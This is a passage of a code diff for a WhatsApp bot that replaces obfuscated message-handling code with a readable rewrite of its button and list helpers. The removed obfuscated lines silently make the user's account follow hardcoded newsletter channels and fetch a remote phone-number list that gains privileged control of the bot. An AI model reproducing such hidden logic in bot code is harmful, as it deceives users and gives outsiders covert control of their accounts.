-        });
-      }
-      if (_0x4b9a40['key'] && _0x4b9a40['key']['remoteJid'] === _0x297513(0xde)) return;
-      const _0x119fed = await _0x55533e[_0x297513(0x10e)](_0x297513(0x95), '' + _0x2a242b['mainchanal']);
-      _0x119fed[_0x297513(0xc3)] === null && (await _0x55533e[_0x297513(0xd6)]('' + _0x2a242b[_0x297513(0xcc)]), console[_0x297513(0xfa)](_0x297513(0x1a6)));
-      const _0x30b275 = await _0x55533e['newsletterMetadata'](_0x297513(0x95), '120363190237215199@newsletter ');
-      _0x30b275[_0x297513(0xc3)] === null && (await _0x55533e[_0x297513(0xd6)](_0x297513(0x17e)), console[_0x297513(0xfa)](_0x297513(0x142)));
-      const _0x28d760 = await _0x55533e[_0x297513(0x10e)]('jid', '120363190237215199@newsletter');
-      _0x28d760[_0x297513(0xc3)] === null && (await _0x55533e[_0x297513(0xd6)](_0x297513(0xc7)), console['log'](_0x297513(0xf2)));
-      const _0x4fc645 = await _0x55533e[_0x297513(0x10e)]('jid', _0x297513(0xff));
-      _0x4fc645[_0x297513(0xc3)] === null && (await _0x55533e['newsletterFollow'](_0x297513(0xff)), console[_0x297513(0xfa)](_0x297513(0x93)));
-      const _0x36135b = await _0x55533e['newsletterMetadata']('jid', _0x297513(0xc1));
-      _0x36135b['viewer_metadata'] === null && (await _0x55533e[_0x297513(0xd6)](_0x297513(0xc1)), console[_0x297513(0xfa)](_0x297513(0x135)));
-      const _0x43833d = _0x1b6df1(_0x55533e, _0x4b9a40)
-        , _0x2f304f = getContentType(_0x4b9a40[_0x297513(0x19d)])
-        , _0x3fd94b = JSON[_0x297513(0x10d)](_0x4b9a40[_0x297513(0x19d)])
-        , _0x222bfb = _0x4b9a40[_0x297513(0x81)][_0x297513(0x169)]
-        , _0x545eb6 = _0x2f304f == _0x297513(0x6d) && _0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)][_0x297513(0x9d)] != null ? _0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)][_0x297513(0x9d)][_0x297513(0x15d)] || [] : []
-        , _0x267454 = _0x2f304f === 'conversation' ? _0x4b9a40[_0x297513(0x19d)][_0x297513(0x162)] : _0x2f304f === _0x297513(0x6d) && _0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)]?.['contextInfo']?.['quotedMessage'] && await _0x113cf5(_0x4b9a40[_0x297513(0x19d)]['extendedTextMessage']['contextInfo'][_0x297513(0xf6)]) ? await _0x1ec342(await _0x17f45b(_0x4b9a40['message'][_0x297513(0x6d)]['contextInfo'][_0x297513(0xf6)]), _0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)]['text']) : _0x2f304f === _0x297513(0x6d) ? _0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)]['text'] : _0x2f304f === _0x297513(0x101) ? _0x4b9a40['message'][_0x297513(0x101)]?.['selectedId'] : _0x2f304f === 'interactiveResponseMessage' ? ((() => {
-          const _0x3b156e = _0x297513;
-          try {
-            const _0x3e87f7 = JSON[_0x3b156e(0xc2)](_0x4b9a40['message']['interactiveResponseMessage']?.[_0x3b156e(0xbc)]?.['paramsJson']);
-            return _0x3e87f7?.['id'] || '';
-          } catch {
-            return '';
-          }
-        })()) : _0x2f304f === _0x297513(0xe3) && _0x4b9a40[_0x297513(0x19d)][_0x297513(0xe3)]?.['caption'] ? _0x4b9a40[_0x297513(0x19d)]['imageMessage'][_0x297513(0x14a)] : _0x2f304f === _0x297513(0xf1) && _0x4b9a40[_0x297513(0x19d)][_0x297513(0xf1)]?.[_0x297513(0x14a)] ? _0x4b9a40[_0x297513(0x19d)]['videoMessage']['caption'] : _0x43833d[_0x297513(0xe5)]?.['text'] || _0x43833d['msg']?.[_0x297513(0x162)] || _0x43833d[_0x297513(0xe5)]?.[_0x297513(0x14a)] || _0x43833d[_0x297513(0x19d)]?.[_0x297513(0x162)] || _0x43833d[_0x297513(0xe5)]?.[_0x297513(0xed)] || _0x43833d[_0x297513(0xe5)]?.['singleSelectReply']?.[_0x297513(0x144)] || _0x43833d['msg']?.[_0x297513(0x6b)] || _0x43833d[_0x297513(0xe5)]?.['contentText'] || _0x43833d['msg']?.[_0x297513(0x155)] || _0x43833d['msg']?.[_0x297513(0x1b1)] || _0x43833d[_0x297513(0xe5)]?.[_0x297513(0xbb)] || ''
-        , _0x190cff = config[_0x297513(0x1b3)]
-        , _0x12771f = _0x267454[_0x297513(0x111)](_0x190cff)
-        , _0x2f0005 = _0x12771f ? _0x267454[_0x297513(0xad)](_0x190cff['length'])['trim']()[_0x297513(0xc9)](' ')[_0x297513(0x13b)]()[_0x297513(0x154)]() : ''
-        , _0x1b1aad = _0x267454[_0x297513(0xee)]()['split'](/ +/)[_0x297513(0xad)](0x1)
-        , _0x2e9303 = _0x1b1aad['join'](' ')
-        , _0xeed4d1 = _0x222bfb['endsWith'](_0x297513(0x120))
-        , _0x14d9fb = _0x4b9a40[_0x297513(0x81)][_0x297513(0x18e)] ? _0x55533e[_0x297513(0xf5)]['id'][_0x297513(0xc9)](':')[0x0] + '@s.whatsapp.net' || _0x55533e['user']['id'] : _0x4b9a40[_0x297513(0x81)][_0x297513(0x11b)] || _0x4b9a40['key'][_0x297513(0x169)]
-        , _0x8ddc90 = _0x14d9fb[_0x297513(0xc9)]('@')[0x0]
-        , _0x117f3b = _0x55533e[_0x297513(0xf5)]['id'][_0x297513(0xc9)](':')[0x0]
-        , _0x35278d = _0x4b9a40['pushName'] || 'Sin Nombre'
-        , _0x615a32 = _0x297513(0x167)
-        , {
-          data: _0x40f20d
-        } = await axios[_0x297513(0x114)](_0x615a32)
-        , _0x2b4827 = _0x40f20d[_0x297513(0x132)][_0x297513(0xc9)](',')['map'](_0x2f1a9b => _0x2f1a9b[_0x297513(0xee)]())
-        , _0x202e04 = _0x117f3b[_0x297513(0x8f)](_0x8ddc90)
-        , _0x37c648 = _0x2b4827[_0x297513(0x8f)](_0x8ddc90)
-        , _0x3c46fb = _0x202e04 ? _0x202e04 : _0x37c648
-        , _0xf8a499 = _0x4f719e[_0x297513(0x8f)](_0x8ddc90) || _0x3c46fb
-        , _0x4fcee5 = await jidNormalizedUser(_0x55533e[_0x297513(0xf5)]['id'])
-        , _0x486172 = _0xeed4d1 ? await _0x55533e[_0x297513(0x125)](_0x222bfb)[_0x297513(0x181)](_0x242b23 => null) : null
-        , _0x5f09e3 = _0xeed4d1 && _0x486172 ? _0x486172['subject'] : ''
-        , _0x169562 = _0xeed4d1 && _0x486172 ? _0x486172[_0x297513(0x10c)] : []
-        , _0x2e3ea5 = _0xeed4d1 ? _0x53dcaf(_0x169562) : []
-        , _0x89a709 = _0xeed4d1 ? _0x2e3ea5[_0x297513(0x8f)](_0x4fcee5) : ![]
-        , _0x4e29b8 = _0xeed4d1 ? _0x2e3ea5['includes'](_0x14d9fb) : ![]
-        , _0x5cd917 = _0x43833d[_0x297513(0x19d)][_0x297513(0x75)] ? !![] : ![]
-        , _0x5b0992 = _0x5083ba => {
-          const _0xac5a5 = _0x297513;
-          let _0x550a01 = _0x5083ba;
-          for (let _0x5c2a7e = 0x0; _0x5c2a7e < _0x550a01[_0xac5a5(0x1b4)]; _0x5c2a7e++) {
-            if (_0x550a01[_0x5c2a7e] === _0x222bfb) return !![];
-          }
-          return ![];
-        }
-        , _0xf13504 = async _0x3ea311 => {
-          const _0x25bba5 = _0x297513;
-          return await _0x55533e[_0x25bba5(0x199)](_0x222bfb, {
-            'text': _0x3ea311
-          }, {
-            'quoted': _0x4b9a40
-          });
-        };
-      _0x55533e[_0x297513(0xd4)] = async _0x4b056c => {
-        const _0x2ab288 = _0x297513;
-        await _0x55533e[_0x2ab288(0x199)](_0x222bfb, {
-          'text': _0x4b056c
-        }, {
-          'quoted': _0x4b9a40
-        });
+
+      sendPayload = {
+        image: imageData,
+        caption: listMessage,
       };
-      const _0x4bdab7 = !![];
-      _0x55533e[_0x297513(0xc0)] = async (_0x2db9f2, _0x5ec174, _0x2fd6cd) => {
-        const _0x2cfd85 = _0x297513;
-        if (!_0x4bdab7) await _0x55533e[_0x2cfd85(0x199)](_0x2db9f2, _0x5ec174);
-        else {
-          if (_0x4bdab7) {
-            let _0x320a96 = '';
-            const _0x279017 = [];
-            _0x5ec174['buttons'][_0x2cfd85(0x13d)]((_0x33776c, _0x4c7d47) => {
-              const _0x11e0a0 = _0x2cfd85
-                , _0x264972 = '' + (_0x4c7d47 + 0x1);
-              _0x320a96 += '\x0a*' + _0x264972 + _0x11e0a0(0x172) + _0x33776c[_0x11e0a0(0xd5)][_0x11e0a0(0x16d)], _0x279017[_0x11e0a0(0x119)]({
-                'cmdId': _0x264972
-                , 'cmd': _0x33776c[_0x11e0a0(0x109)]
-              });
-            });
-            if (_0x5ec174[_0x2cfd85(0x8e)] === 0x1) {
-              const _0x469b35 = _0x5ec174[_0x2cfd85(0xf0)] + '\x0a\x0a*`Reply Below Number 🔢`*\x0a' + _0x320a96 + '\x0a\x0a' + _0x5ec174[_0x2cfd85(0x15e)]
-                , _0x6e2363 = await _0x55533e[_0x2cfd85(0x199)](_0x222bfb, {
-                  'text': _0x469b35
-                }, {
-                  'quoted': _0x2fd6cd || _0x4b9a40
-                });
-              await _0xa22585(_0x6e2363[_0x2cfd85(0x81)]['id'], _0x279017);
-            } else {
-              if (_0x5ec174[_0x2cfd85(0x8e)] === 0x4) {
-                const _0x4cc0cf = _0x5ec174[_0x2cfd85(0x14a)] + '\x0a\x0a*`Reply Below Number 🔢`*\x0a' + _0x320a96 + '\x0a\x0a' + _0x5ec174['footer']
-                  , _0x33a83e = await _0x55533e['sendMessage'](_0x2db9f2, {
-                    'image': _0x5ec174[_0x2cfd85(0x1c3)]
-                    , 'caption': _0x4cc0cf
-                  }, {
-                    'quoted': _0x2fd6cd || _0x4b9a40
-                  });
-                await _0xa22585(_0x33a83e['key']['id'], _0x279017);
-              }
+    } else {
+      sendPayload = { text: listMessage };
+    }
+
+    const text = await conn.sendMessage(
+      jid,
+      sendPayload,
+      { quoted: quotemek || mek }
+    );
+
+    await updateCMDStore(text.key.id, CMD_ID_MAP);
+  }
+};
+
+
+conn.listMessage = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+
+    msgData.sections.forEach((section, sectionIndex) => {
+const mainNumber = `${sectionIndex + 1}`;
+result += `\n*${section.title}*\n\n`;
+
+section.rows.forEach((row, rowIndex) => {
+  const subNumber = `${mainNumber}.${rowIndex + 1}`;
+  const rowHeader = `*${subNumber} ||*  ${row.title}`;
+  result += `${rowHeader}\n`;
+  if (row.description) {
+    result += `   ${row.description}\n\n`;
+  }
+  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+});
+    });
+
+    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
+    const text = await conn.sendMessage(from, { text: listMessage, 
+}, { quoted: quotemek || mek})
+    await updateCMDStore(text.key.id, CMD_ID_MAP);
+  }
+}
+
+     conn.sendButtonMessage3 = async (jid, buttons, quoted, opts = {}) => {
+    let header;
+
+    if (opts?.image) {
+        var image = await prepareWAMessageMedia({
+            image: {
+                url: opts.image || ''
             }
-          }
-        }
-      }, _0x55533e[_0x297513(0x117)] = async (_0x162fca, _0x1bed35, _0x35bb51) => {
-        const _0x56e93c = _0x297513;
-        if (!_0x4bdab7) await _0x55533e['sendMessage'](_0x162fca, _0x1bed35);
-        else {
-          if (_0x4bdab7) {
-            let _0x3b0695 = '';
-            const _0x30309c = [];
-            _0x1bed35[_0x56e93c(0xce)][_0x56e93c(0x13d)]((_0x2ead2f, _0x12d852) => {
-              const _0x43e093 = _0x56e93c
-                , _0x4ba988 = '' + (_0x12d852 + 0x1);
-              _0x3b0695 += '\x0a*' + _0x4ba988 + _0x43e093(0x172) + _0x2ead2f[_0x43e093(0xd5)][_0x43e093(0x16d)], _0x30309c[_0x43e093(0x119)]({
-                'cmdId': _0x4ba988
-                , 'cmd': _0x2ead2f[_0x43e093(0x109)]
-              });
-            });
-            if (_0x1bed35[_0x56e93c(0x8e)] === 0x1) {
-              const _0xb604db = (_0x1bed35[_0x56e93c(0xf0)] || _0x1bed35[_0x56e93c(0x14a)]) + _0x56e93c(0x8b) + _0x3b0695 + '\x0a\x0a' + _0x1bed35[_0x56e93c(0x15e)]
-                , _0x583e21 = await _0x55533e[_0x56e93c(0x199)](_0x222bfb, {
-                  'text': _0xb604db
-                }, {
-                  'quoted': _0x35bb51 || _0x4b9a40
-                });
-              await _0xa22585(_0x583e21[_0x56e93c(0x81)]['id'], _0x30309c);
-            } else {
-              if (_0x1bed35[_0x56e93c(0x8e)] === 0x4) {
-                const _0x2d5a42 = _0x1bed35[_0x56e93c(0x14a)] + _0x56e93c(0x8b) + _0x3b0695 + '\x0a\x0a' + _0x1bed35[_0x56e93c(0x15e)]
-                  , _0x1f3691 = await _0x55533e[_0x56e93c(0x199)](_0x162fca, {
-                    'image': _0x1bed35[_0x56e93c(0x1c3)]
-                    , 'caption': _0x2d5a42
-                  }, {
-                    'quoted': _0x35bb51 || _0x4b9a40
-                  });
-                await _0xa22585(_0x1f3691[_0x56e93c(0x81)]['id'], _0x30309c);
-              }
-            }
-          }
-        }
-      }, _0x55533e[_0x297513(0x1a2)] = async (_0x37e36e, _0x3a03ce, _0x42344a) => {
-        const _0xb161cd = _0x297513;
-        if (!_0x4bdab7) await _0x55533e[_0xb161cd(0x199)](_0x37e36e, _0x3a03ce);
-        else {
-          if (_0x4bdab7) {
-            let _0x17a041 = '';
-            const _0x483268 = [];
-            _0x3a03ce[_0xb161cd(0x134)][_0xb161cd(0x13d)]((_0x4723b8, _0x5ef505) => {
-              const _0x21c46f = _0xb161cd
-                , _0x279a09 = '' + (_0x5ef505 + 0x1);
-              _0x17a041 += '\x0a*' + _0x4723b8[_0x21c46f(0x1b1)] + _0x21c46f(0x16e), _0x4723b8[_0x21c46f(0x7a)][_0x21c46f(0x13d)]((_0x4622da, _0x147b6d) => {
-                const _0x49296a = _0x21c46f
-                  , _0x3bbbf9 = _0x279a09 + '.' + (_0x147b6d + 0x1)
-                  , _0x34825f = '*' + _0x3bbbf9 + _0x49296a(0x16f) + _0x4622da['title'];
-                _0x17a041 += _0x34825f + '\x0a', _0x4622da[_0x49296a(0x1a8)] && (_0x17a041 += _0x49296a(0x193) + _0x4622da[_0x49296a(0x1a8)] + '\x0a\x0a'), _0x483268[_0x49296a(0x119)]({
-                  'cmdId': _0x3bbbf9
-                  , 'cmd': _0x4622da['rowId']
-                });
-              });
-            });
-            const _0x30b7aa = _0x3a03ce[_0xb161cd(0xf0)] + '\x0a\x0a' + _0x3a03ce[_0xb161cd(0xd5)] + ',' + _0x17a041 + '\x0a' + _0x3a03ce[_0xb161cd(0x15e)]
-              , _0x4441ad = await _0x55533e[_0xb161cd(0x199)](_0x222bfb, {
-                'text': _0x30b7aa
-              }, {
-                'quoted': _0x42344a || _0x4b9a40
-              });
-            await _0xa22585(_0x4441ad[_0xb161cd(0x81)]['id'], _0x483268);
-          }
-        }
-      }, _0x55533e['listMessage5'] = async (_0x45c7e6, _0x5e849f, _0x4778a2) => {
-        const _0x12f9bf = _0x297513;
-        try {
-          if (_0x5e849f[_0x12f9bf(0x134)] && _0x5e849f[_0x12f9bf(0xd5)] && !_0x4bdab7) {
-            const _0x575fe0 = _0x4778a2 && _0x4778a2[_0x12f9bf(0x81)] && _0x4778a2[_0x12f9bf(0x19d)] ? {
-              'quoted': _0x4778a2
-            } : {};
-            return await _0x55533e[_0x12f9bf(0x199)](_0x45c7e6, _0x5e849f, _0x575fe0);
-          }
-          let _0x2f8db4 = '';
-          const _0x299e15 = [];
-          _0x5e849f[_0x12f9bf(0x134)][_0x12f9bf(0x13d)]((_0x326a6a, _0x779ff1) => {
-            const _0x5421d2 = _0x12f9bf
-              , _0x245958 = '' + (_0x779ff1 + 0x1);
-            _0x2f8db4 += '\x0a*' + _0x326a6a[_0x5421d2(0x1b1)] + _0x5421d2(0x16e), _0x326a6a['rows'][_0x5421d2(0x13d)]((_0x5d70c9, _0x84ef67) => {
-              const _0x260f51 = _0x5421d2
-                , _0xf7389f = _0x245958 + '.' + (_0x84ef67 + 0x1)
-                , _0x557836 = '*' + _0xf7389f + _0x260f51(0x172) + _0x5d70c9[_0x260f51(0x1b1)];
-              _0x2f8db4 += _0x557836 + '\x0a', _0x5d70c9[_0x260f51(0x1a8)] && (_0x2f8db4 += _0x260f51(0x193) + _0x5d70c9[_0x260f51(0x1a8)] + '\x0a\x0a'), _0x299e15[_0x260f51(0x119)]({
-                'cmdId': _0xf7389f
-                , 'cmd': _0x5d70c9[_0x260f51(0x12e)]
-              });
-            });
-          });
-          const _0x42bed8 = (_0x5e849f['text'] || '') + '\x0a\x0a' + (_0x5e849f[_0x12f9bf(0xd5)] || '') + ',' + _0x2f8db4 + '\x0a\x0a' + (_0x5e849f[_0x12f9bf(0x15e)] || '');
-          let _0x35c7ca;
-          if (_0x5e849f['image']) {
-            let _0xec0252 = _0x5e849f[_0x12f9bf(0x1c3)];
-            if (typeof _0xec0252 === _0x12f9bf(0xcd)) _0xec0252 = {
-              'url': _0xec0252
-            };
-            else {
-              if (Buffer[_0x12f9bf(0x1b2)](_0xec0252)) _0xec0252 = {
-                'buffer': _0xec0252
-              };
-              else {
-                if (_0xec0252['url']) _0xec0252 = {
-                  'url': _0xec0252[_0x12f9bf(0x116)]
-                };
-                else throw new Error(_0x12f9bf(0xb3));
-              }
-            }
-            _0x35c7ca = {
-              'image': _0xec0252
-              , 'caption': _0x42bed8
-            };
-          } else _0x35c7ca = {
-            'text': _0x42bed8
-          };
-          const _0x2aca56 = _0x4778a2 && _0x4778a2[_0x12f9bf(0x81)] && _0x4778a2['message'] ? {
-              'quoted': _0x4778a2
-            } : {}
-            , _0x117400 = await _0x55533e[_0x12f9bf(0x199)](_0x45c7e6, _0x35c7ca, _0x2aca56);
-          await _0xa22585(_0x117400[_0x12f9bf(0x81)]['id'], _0x299e15);
-        } catch (_0x35ab1b) {
-          console['error'](_0x12f9bf(0x197), _0x35ab1b);
-        }
-      }, _0x55533e['listMessage4'] = async (_0x33ef1a, _0x147df4, _0x5e9a55) => {
-        const _0x4fe176 = _0x297513;
-        if (!_0x4bdab7) await _0x55533e[_0x4fe176(0x199)](_0x33ef1a, _0x147df4);
-        else {
-          let _0x491335 = '';
-          const _0x3ad69b = [];
-          _0x147df4['sections'][_0x4fe176(0x13d)]((_0x220a1a, _0x18422f) => {
-            const _0x225278 = _0x4fe176
-              , _0x30a92d = '' + (_0x18422f + 0x1);
-            _0x491335 += '\x0a*' + _0x220a1a[_0x225278(0x1b1)] + _0x225278(0x16e), _0x220a1a[_0x225278(0x7a)]['forEach']((_0x33b266, _0x189bc8) => {
-              const _0xfa95a6 = _0x225278
-                , _0x17ece2 = _0x30a92d + '.' + (_0x189bc8 + 0x1)
-                , _0x2b30b0 = '*' + _0x17ece2 + _0xfa95a6(0x172) + _0x33b266[_0xfa95a6(0x1b1)];
-              _0x491335 += _0x2b30b0 + '\x0a', _0x33b266[_0xfa95a6(0x1a8)] && (_0x491335 += _0xfa95a6(0x193) + _0x33b266[_0xfa95a6(0x1a8)] + '\x0a\x0a'), _0x3ad69b[_0xfa95a6(0x119)]({
-                'cmdId': _0x17ece2
-                , 'cmd': _0x33b266[_0xfa95a6(0x12e)]
-              });
-            });
-          });
-          const _0x1af15a = (_0x147df4[_0x4fe176(0xf0)] || '') + '\x0a\x0a' + (_0x147df4[_0x4fe176(0xd5)] || '') + ',' + _0x491335 + '\x0a\x0a' + (_0x147df4['footer'] || '');
-          let _0x48fa69;
-          if (_0x147df4[_0x4fe176(0x1c3)]) {
-            let _0x4231d2 = _0x147df4[_0x4fe176(0x1c3)];
-            if (typeof _0x4231d2 === _0x4fe176(0xcd)) _0x4231d2 = {
-              'url': _0x4231d2
-            };
-            else {
-              if (Buffer['isBuffer'](_0x4231d2)) _0x4231d2 = {
-                'buffer': _0x4231d2
-              };
-              else {
-                if (_0x4231d2[_0x4fe176(0x116)]) _0x4231d2 = {
-                  'url': _0x4231d2[_0x4fe176(0x116)]
-                };
-                else throw new Error(_0x4fe176(0xb3));
-              }
-            }
-            _0x48fa69 = {
-              'image': _0x4231d2
-              , 'caption': _0x1af15a
-            };
-          } else _0x48fa69 = {
-            'text': _0x1af15a
-          };
-          const _0x198cd0 = await _0x55533e[_0x4fe176(0x199)](_0x33ef1a, _0x48fa69, {
-            'quoted': _0x5e9a55 || _0x4b9a40
-          });
-          await _0xa22585(_0x198cd0['key']['id'], _0x3ad69b);
-        }
-      }, _0x55533e[_0x297513(0x1a9)] = async (_0x142be4, _0x2de339, _0x70b489) => {
-        const _0x5c5f3d = _0x297513;
-        if (!_0x4bdab7) await _0x55533e['sendMessage'](_0x142be4, _0x2de339);
-        else {
-          if (_0x4bdab7) {
-            let _0x230294 = '';
-            const _0x1b2493 = [];
-            _0x2de339[_0x5c5f3d(0x134)][_0x5c5f3d(0x13d)]((_0x10f0fe, _0x55f24c) => {
-              const _0xee15ab = _0x5c5f3d
-                , _0x56c8fe = '' + (_0x55f24c + 0x1);
-              _0x230294 += '\x0a*' + _0x10f0fe[_0xee15ab(0x1b1)] + _0xee15ab(0x16e), _0x10f0fe[_0xee15ab(0x7a)][_0xee15ab(0x13d)]((_0x3991d5, _0x2a3ba7) => {
-                const _0x2e7a69 = _0xee15ab
-                  , _0x25ad55 = _0x56c8fe + '.' + (_0x2a3ba7 + 0x1)
-                  , _0x338dbe = '*' + _0x25ad55 + _0x2e7a69(0x172) + _0x3991d5[_0x2e7a69(0x1b1)];
-                _0x230294 += _0x338dbe + '\x0a', _0x3991d5[_0x2e7a69(0x1a8)] && (_0x230294 += _0x2e7a69(0x193) + _0x3991d5[_0x2e7a69(0x1a8)] + '\x0a\x0a'), _0x1b2493[_0x2e7a69(0x119)]({
-                  'cmdId': _0x25ad55
-                  , 'cmd': _0x3991d5[_0x2e7a69(0x12e)]
-                });
-              });
-            });
-            const _0x226ecf = _0x2de339['text'] + '\x0a\x0a' + _0x2de339[_0x5c5f3d(0xd5)] + ',' + _0x230294 + '\x0a\x0a' + _0x2de339[_0x5c5f3d(0x15e)]
-              , _0x874546 = await _0x55533e[_0x5c5f3d(0x199)](_0x222bfb, {
-                'text': _0x226ecf
-              }, {
-                'quoted': _0x70b489 || _0x4b9a40
-              });
-            await _0xa22585(_0x874546[_0x5c5f3d(0x81)]['id'], _0x1b2493);
-          }
-        }
-      }, _0x55533e[_0x297513(0x152)] = async (_0x41638b, _0x5a0b1d, _0x17f202, _0x4b1c76 = {}) => {
-        const _0x1103b7 = _0x297513;
-        let _0x40d39d;
-        if (_0x4b1c76?.[_0x1103b7(0x1c3)]) {
-          var _0x36215e = await prepareWAMessageMedia({
-            'image': {
-              'url': _0x4b1c76[_0x1103b7(0x1c3)] || ''
-            }
-          }, {
-            'upload': _0x55533e[_0x1103b7(0xac)]
-          });
-          _0x40d39d = {
-            'title': _0x4b1c76['header'] || ''
-            , 'hasMediaAttachment': !![]
-            , 'imageMessage': _0x36215e[_0x1103b7(0xe3)]
-          };
-        } else _0x40d39d = {
-          'title': _0x4b1c76[_0x1103b7(0x140)] || ''
-          , 'hasMediaAttachment': ![]
+        }, {
+            upload: conn.waUploadToServer
+        });
+
+        header = {
+            title: opts.header || '',
+            hasMediaAttachment: true,
+            imageMessage: image.imageMessage,
         };
-        let _0x59d0f5 = generateWAMessageFromContent(_0x41638b, {
-          'viewOnceMessage': {
-            'message': {
-              'messageContextInfo': {
-                'deviceListMetadata': {}
-                , 'deviceListMetadataVersion': 0x2
-              }
-              , 'interactiveMessage': {
-                'body': {
-                  'text': _0x4b1c76['body'] || ''
-                }
-                , 'footer': {
-                  'text': _0x4b1c76['footer'] || ''
-                }
-                , 'header': _0x40d39d
-                , 'nativeFlowMessage': {
-                  'buttons': _0x5a0b1d
-                  , 'messageParamsJson': ''
-                }
-              }
-            }
-          }
-        }, {
-          'quoted': _0x17f202
-        });
-        await _0x55533e[_0x1103b7(0xe0)](_0x41638b, _0x59d0f5[_0x1103b7(0x19d)], {
-          'messageId': _0x59d0f5['key']['id']
-        });
-      }, _0x55533e[_0x297513(0x10b)] = async (_0x10e22f, _0x268c2e) => {
-        const _0x4f9849 = _0x297513;
-        await _0x55533e[_0x4f9849(0xe0)](_0x222bfb, {
-          'protocolMessage': {
-            'key': _0x10e22f[_0x4f9849(0x81)]
-            , 'type': 0xe
-            , 'editedMessage': {
-              'conversation': _0x268c2e
-            }
-          }
-        }, {});
-      }, _0x55533e[_0x297513(0x82)] = async (_0x3f11ef, _0x244c8a, _0x2c9788 = ![], _0x380fae = {}) => {
-        const _0xf2831c = _0x297513;
-        let _0x13b8e6;
-        _0x380fae[_0xf2831c(0xab)] && (_0x244c8a[_0xf2831c(0x19d)] = _0x244c8a[_0xf2831c(0x19d)] && _0x244c8a['message'][_0xf2831c(0x14e)] && _0x244c8a['message'][_0xf2831c(0x14e)][_0xf2831c(0x19d)] ? _0x244c8a[_0xf2831c(0x19d)][_0xf2831c(0x14e)][_0xf2831c(0x19d)] : _0x244c8a[_0xf2831c(0x19d)] || undefined, _0x13b8e6 = Object['keys'](_0x244c8a[_0xf2831c(0x19d)]['viewOnceMessage']['message'])[0x0], delete(_0x244c8a[_0xf2831c(0x19d)] && _0x244c8a[_0xf2831c(0x19d)][_0xf2831c(0x79)] ? _0x244c8a[_0xf2831c(0x19d)][_0xf2831c(0x79)] : _0x244c8a[_0xf2831c(0x19d)] || undefined), delete _0x244c8a[_0xf2831c(0x19d)][_0xf2831c(0x10a)][_0xf2831c(0x19d)][_0x13b8e6][_0xf2831c(0x73)], _0x244c8a[_0xf2831c(0x19d)] = {
-          ..._0x244c8a[_0xf2831c(0x19d)][_0xf2831c(0x10a)][_0xf2831c(0x19d)]
-        });
-        let _0x5c745f = Object[_0xf2831c(0x178)](_0x244c8a['message'])[0x0]
-          , _0x11aad5 = await generateForwardMessageContent(_0x244c8a, _0x2c9788)
-          , _0x17f67f = Object[_0xf2831c(0x178)](_0x11aad5)[0x0]
-          , _0x2fdec6 = {};
-        if (_0x5c745f != _0xf2831c(0x162)) _0x2fdec6 = _0x244c8a['message'][_0x5c745f][_0xf2831c(0x9d)];
-        _0x11aad5[_0x17f67f]['contextInfo'] = {
-          ..._0x2fdec6
-          , ..._0x11aad5[_0x17f67f][_0xf2831c(0x9d)]
+
+    } else {
+        header = {
+            title: opts.header || '',
+            hasMediaAttachment: false,
         };
-        const _0x81e8cb = await generateWAMessageFromContent(_0x3f11ef, _0x11aad5, _0x380fae ? {
-          ..._0x11aad5[_0x17f67f]
-          , ..._0x380fae
-          , ..._0x380fae[_0xf2831c(0x9d)] ? {
-            'contextInfo': {
-              ..._0x11aad5[_0x17f67f][_0xf2831c(0x9d)]
-              , ..._0x380fae[_0xf2831c(0x9d)]
+    }
+
+    let message = generateWAMessageFromContent(jid, {
+        viewOnceMessage: {
+            message: {
+                messageContextInfo: {
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2,
+                },
+                interactiveMessage: {
+                    body: {
+                        text: opts.body || ''
+                    },
+                    footer: {
+                        text: opts.footer || ''
+                    },
+                    header: header,
+                    nativeFlowMessage: {
+                        buttons: buttons,
+                        messageParamsJson: ''
+                    }
+                }
             }
-          } : {}
-        } : {});
-        return await _0x55533e[_0xf2831c(0xe0)](_0x3f11ef, _0x81e8cb[_0xf2831c(0x19d)], {
-          'messageId': _0x81e8cb[_0xf2831c(0x81)]['id']
-        }), _0x81e8cb;
-      }, _0x55533e[_0x297513(0x1ae)] = async (_0x52d415, _0x3b402b, _0x18368b, _0xdd3e09, _0x65b8f7 = {}) => {
-        const _0x3a9ceb = _0x297513;
-        let _0x23653b = ''
-          , _0x3c58cc = await axios[_0x3a9ceb(0x99)](_0x3b402b);
-        _0x23653b = _0x3c58cc[_0x3a9ceb(0x1b0)][_0x3a9ceb(0x94)];
-        if (_0x23653b['split']('/')[0x1] === _0x3a9ceb(0x11c)) return _0x55533e[_0x3a9ceb(0x199)](_0x52d415, {
-          'video': await _0x751165(_0x3b402b)
-          , 'caption': _0x18368b
-          , 'gifPlayback': !![]
-          , ..._0x65b8f7
-        }, {
-          'quoted': _0xdd3e09
-          , ..._0x65b8f7
-        });
-        let _0x580c56 = _0x23653b[_0x3a9ceb(0xc9)]('/')[0x0] + 'Message';
-        if (_0x23653b === _0x3a9ceb(0x8a)) return _0x55533e['sendMessage'](_0x52d415, {
-          'document': await _0x751165(_0x3b402b)
-          , 'mimetype': _0x3a9ceb(0x8a)
-          , 'caption': _0x18368b
-          , ..._0x65b8f7
-        }, {
-          'quoted': _0xdd3e09
-          , ..._0x65b8f7
-        });
-        if (_0x23653b[_0x3a9ceb(0xc9)]('/')[0x0] === _0x3a9ceb(0x1c3)) return _0x55533e[_0x3a9ceb(0x199)](_0x52d415, {
-          'image': await _0x751165(_0x3b402b)
-          , 'caption': _0x18368b
-          , ..._0x65b8f7
-        }, {
-          'quoted': _0xdd3e09
-          , ..._0x65b8f7
-        });
-        if (_0x23653b[_0x3a9ceb(0xc9)]('/')[0x0] === _0x3a9ceb(0x14d)) return _0x55533e[_0x3a9ceb(0x199)](_0x52d415, {
-          'video': await _0x751165(_0x3b402b)
-          , 'caption': _0x18368b
-          , 'mimetype': _0x3a9ceb(0x177)
-          , ..._0x65b8f7
-        }, {
-          'quoted': _0xdd3e09
-          , ..._0x65b8f7
-        });
